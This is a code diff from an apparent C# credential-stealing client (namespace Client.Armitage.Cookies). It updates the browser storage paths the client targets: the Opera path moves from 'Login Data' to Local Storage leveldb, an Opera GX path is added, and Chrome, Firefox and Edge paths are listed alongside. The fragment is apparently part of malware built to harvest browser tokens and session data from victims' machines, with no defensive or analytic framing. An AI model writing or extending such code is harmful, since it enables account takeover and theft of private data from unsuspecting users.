@@ -29,7 +29,9 @@ namespace Client.Armitage.Cookies
                 // chromu
                 Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb",
                 // opera, who tf uses this
-                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\Login Data",
+                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb",
+                // opera, but cancer
+                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb",
                 // firufoxu
                 Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Mozilla\Firefox\Profiles\Default\Local Storage\leveldb",
                 // micrusufu edgu
